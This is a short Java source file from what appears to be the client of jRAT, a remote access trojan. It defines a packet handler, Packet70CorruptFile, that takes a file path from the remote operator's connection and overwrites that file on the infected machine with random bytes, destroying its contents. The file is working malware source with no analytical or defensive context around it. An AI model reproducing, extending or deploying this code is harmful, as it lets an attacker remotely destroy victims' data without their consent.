package jrat.client.packets.incoming;

import jrat.client.Connection;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Random;


public class Packet70CorruptFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		File f = new File(file);
		if (f.exists()) {
			int length = (int) f.length();
			FileOutputStream out = new FileOutputStream(f);
			byte[] b = new byte[1024];
			int done = 0;
			do {
				(new Random()).nextBytes(b);
				out.write(b);
				done += 1024;
			} while (done < length);
			out.close();
		}
	}

}
